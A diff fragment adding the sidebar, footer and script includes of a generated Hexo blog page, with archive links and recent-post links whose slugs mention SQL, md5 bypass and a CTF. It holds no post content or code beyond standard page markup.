+      <a href="/tags/%E6%88%91%E6%9C%8D%E4%BA%86%EF%BC%8C%E5%88%B0%E5%BA%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89css/" style="font-size: 10px;">我服了，到底为什么没有css</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/10/08/top10/%E6%88%91%E9%82%A3%E6%87%B5%E9%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%AC/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/%E5%87%BD%E6%95%B0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/SQL/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/md5%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/shctf/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
